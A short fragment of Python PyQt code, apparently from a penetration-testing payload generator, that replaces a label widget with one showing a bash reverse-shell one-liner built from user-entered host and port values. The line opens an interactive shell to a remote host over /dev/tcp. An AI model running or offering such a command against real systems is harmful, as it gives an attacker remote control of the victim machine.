            self.tab6_container_layout.removeWidget(self.bash_Scan1)
            self.bash_Scan1.deleteLater()
        self.bash_Scan1 = QLabel("bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1")
